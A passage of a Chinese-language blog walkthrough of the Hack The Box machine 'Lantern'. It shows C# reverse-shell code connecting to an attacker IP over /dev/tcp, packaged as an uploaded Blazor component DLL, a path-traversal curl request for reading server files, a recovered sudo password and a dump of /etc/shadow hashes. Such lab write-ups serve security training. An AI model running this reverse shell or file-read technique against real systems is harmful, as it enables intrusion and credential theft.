<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">BackConnect</span> &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title">ReverseBash</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span> &#123;</span><br><span class="line">          Process proc = <span class="keyword">new</span> System.Diagnostics.Process();</span><br><span class="line">          proc.StartInfo.FileName = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">          proc.StartInfo.Arguments = <span class="string">&quot;-c \&quot;sh -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1\&quot;&quot;</span>;</span><br><span class="line">          proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">          proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">          proc.Start();</span><br><span class="line"></span><br><span class="line">          <span class="keyword">while</span> (!proc.StandardOutput.EndOfStream) &#123;</span><br><span class="line">                Console.WriteLine(proc.StandardOutput.ReadLine());</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译项目，以 release 模式生成</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dotnet build -c release</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112154014500.png" class="">

<p>然后 BurpSuite 开启拦截，上传 dll 文件</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112155255289.png" class="">

<p>将第一个包的数据中的 name 字段更改为下图</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112155618249.png" class="">

<p>后续的数据包都可以放行了</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112155229302.png" class="">

<p>提示上传成功，尝试加载</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112155706548.png" class="">

<p>这里提示缺失 component 类，前面编译时忽略了一点，就是关于 DLL 的加载问题，不像 PE 文件从 Main 函数作为入口，DLL 会有加载函数，那么明白这一点，可以通过模仿 Logs.dll 文件的格式来创建。</p>
<p>通过任意文件读取漏洞下载 Logs.dll</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://lantern.htb//PrivacyAndPolicy?lang=../../../../../&amp;ext=./opt/components/Logs.dll&quot;</span> -o Logs.dll</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112164532252.png" class="">

<p>反编译可以看到对应的架构，直接拿过来修改</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Components;</span><br><span class="line"><span class="keyword">using</span> Microsoft.AspNetCore.Components.Rendering;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">rev</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Component</span> : <span class="title">ComponentBase</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function"><span class="keyword">protected</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">BuildRenderTree</span>(<span class="params">RenderTreeBuilder __builder</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			Process proc = <span class="keyword">new</span> System.Diagnostics.Process();</span><br><span class="line">			proc.StartInfo.FileName = <span class="string">&quot;sh&quot;</span>;</span><br><span class="line">			proc.StartInfo.Arguments = <span class="string">&quot;-c \&quot;sh -i &gt;&amp; /dev/tcp/10.10.16.44/2233 0&gt;&amp;1\&quot;&quot;</span>;</span><br><span class="line">			proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">			proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">			proc.Start();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!proc.StandardOutput.EndOfStream) &#123;</span><br><span class="line">			Console.WriteLine(proc.StandardOutput.ReadLine());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112164843828.png" class="">

<p>但是编译有报错，需要添加两个包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dotnet add package Microsoft.AspNetCore.Components --version 6.0.0</span><br><span class="line">dotnet add package Microsoft.AspNetCore.Components.Web --version 6.0.0</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112170949634.png" class="">

<p>编译通过，继续前面的上传手法，提示文件重复就重新创建一个项目</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112170701751.png" class="">

<p>这次没有报错，但是 Shell 没有弹回来，更改反弹 Shell 命令，再次尝试</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112171607443.png" class="">

<p>可以成功读取私钥</p>
<h3 id="Local-Enum"><a href="#Local-Enum" class="headerlink" title="Local Enum"></a>Local Enum</h3><img src="/2024/11/11/HTB-Lantern/image-20241112171724434.png" class="">

<p>发现 sudo 权限，而且 procmon 可以监控进程行为，猜测有定时或自动任务运行。</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112172130488.png" class="">

<p>查看进程列表，发现可疑进程</p>
<h2 id="Shell-as-Root"><a href="#Shell-as-Root" class="headerlink" title="Shell as Root"></a>Shell as Root</h2><p>运行 procmon</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112172302097.png" class="">

<p>发现一些写入行为，使用 <code>sudo procmon -p [pid]</code> 单独抓取，然后保存信息</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112173619389.png" class="">

<p>信息比较杂，使用 -e 参数指定 write 行为</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112175731726.png" class="">

<p>可以看到 arguments 字段是进程写入相关的信息，可以全部导出来，由于是二进制数据，导出来是hex 格式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(arguments) <span class="keyword">from</span> ebpf;</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112180210005.png" class="">

<p>只抓到了这一点，看来还不够，可以使用 <code>watch -n 1 &quot;ps aux | grep automation&quot;</code> 来监控进程</p>
<p>当它重新拉起的时候开始捕捉数据，对于导出的数据，去掉不可打印字符</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().strip().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg = <span class="built_in">bytes</span>.fromhex(i)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x01&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\x1b&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x06&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\x08&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x90&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\xb9&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\xa5&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\xac&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\x03&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        msg = msg.replace(<span class="string">b&#x27;\xe0&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).replace(<span class="string">b&#x27;\xfd&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]&#x27;</span>)</span><br></pre></td></tr></table></figure>

<img src="/2024/11/11/HTB-Lantern/image-20241112183156047.png" class="">

<p>这里部分行的第一位是有字母的，怀疑和密码有关，把第一位是 <code>[</code> 的行过滤掉</p>
<img src="/2024/11/11/HTB-Lantern/image-20241112184203008.png" class="">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 1.py | awk -F <span class="string">&quot;&#x27;&quot;</span> <span class="string">&#x27;&#123;print $2&#125;&#x27;</span> | <span class="built_in">cut</span> -c 1,2 | <span class="built_in">tr</span> -d <span class="string">&#x27;[?\n &#x27;</span></span><br></pre></td></tr></table></figure>

<p>从 <code>bbaacckkuupp..sshh</code> 来看，应该是写入到文件 <code>backup.sh</code>，那么上面的 <code>QQ33EEddddttddww33ppMMBB</code> 大概是密码的双写了，去重之后为 <code>Q3Eddtdw3pMB</code></p>
<img src="/2024/11/11/HTB-Lantern/image-20241112184258652.png" class="">

<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>打这个靶机如果熟悉 Bolazr 的话，可以快速想到 5000 端口，以及其默认路径，我这里不太了解，只能通过 Top 1000 去扫描。不过这是一个通用的方法，毕竟，谁能把所有框架全部记住呢？</p>
<h3 id="Dump-Hash"><a href="#Dump-Hash" class="headerlink" title="Dump Hash"></a>Dump Hash</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:$y$j9T<span class="variable">$AIkP6DcupUzzLuD19q8Ea</span>.<span class="variable">$yfGWAj50b</span>/chhcl4fuZL3jkIlp2NrkL63C5TXcDumJ0:19718:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:19715:0:99999:7:::</span><br><span class="line">tomas:$y$j9T$iBupKrKnYvDsG24KvgKi61<span class="variable">$P9qTNx7BdVbyqWp5homuabzMA</span>/vr.h3fds5VYDeMII3:19718:0:99999:7:::</span><br><span class="line">lxd:!:19715::::::</span><br><span class="line">_laurel:!:19936::::::</span><br></pre></td></tr></table></figure>

<h3 id="bot-exp"><a href="#bot-exp" class="headerlink" title="bot.exp"></a>bot.exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/expect -f</span></span><br><span class="line"></span><br><span class="line">spawn nano /root/automation.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> text <span class="string">&quot;echo Q3Eddtdw3pMB | sudo ./backup.sh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> &#123;1&#125; &#123;</span><br><span class="line">    foreach char [<span class="built_in">split</span> <span class="variable">$text</span> <span class="string">&quot;&quot;</span>] &#123;</span><br><span class="line">        send <span class="string">&quot;<span class="variable">$char</span>&quot;</span></span><br><span class="line">        <span class="built_in">sleep</span> 1</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send <span class="string">&quot;\r&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">sleep</span> 0.5</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> &#123;<span class="built_in">set</span> i 0&#125; &#123;<span class="variable">$i</span> &lt; [string length <span class="variable">$text</span>]&#125; &#123;incr i&#125; &#123;</span><br><span class="line">        send <span class="string">&quot;\b \b&quot;</span>  ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    send <span class="string">&quot;\r&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/archives/">归档</a></li>
        
          <li><a href="/about">关于</a></li>
        
          <li><a href="/search/">搜索</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Enum-Recon"><span class="toc-number">1.</span> <span class="toc-text">Enum &amp; Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap Scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VHost-Scan"><span class="toc-number">1.2.</span> <span class="toc-text">VHost Scan</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Tomas"><span class="toc-number">2.</span> <span class="toc-text">Shell as Tomas</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Enum"><span class="toc-number">2.1.</span> <span class="toc-text">Local Enum</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-Root"><span class="toc-number">3.</span> <span class="toc-text">Shell as Root</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#More"><span class="toc-number">4.</span> <span class="toc-text">More</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Dump-Hash"><span class="toc-number">4.1.</span> <span class="toc-text">Dump Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bot-exp"><span class="toc-number">4.2.</span> <span class="toc-text">bot.exp</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://fermionorz.github.io/2024/11/11/HTB-Lantern/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&text=Lantern"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&is_video=false&description=Lantern"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Lantern&body=Check out this article: http://fermionorz.github.io/2024/11/11/HTB-Lantern/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&title=Lantern"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&name=Lantern&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://fermionorz.github.io/2024/11/11/HTB-Lantern/&t=Lantern"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024
    Fermionorz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/about">关于</a></li><!--
     --><!--
       --><li><a href="/search/">搜索</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/lxgw-wenkai-screen-webfont/1.5.0/lxgwwenkaiscreenr.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/fira_code.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>

    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'fermionorz/fermionorz.github.io';
      var utterances_issue_term = 'Blog';
      var utterances_label = 'Blog-Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
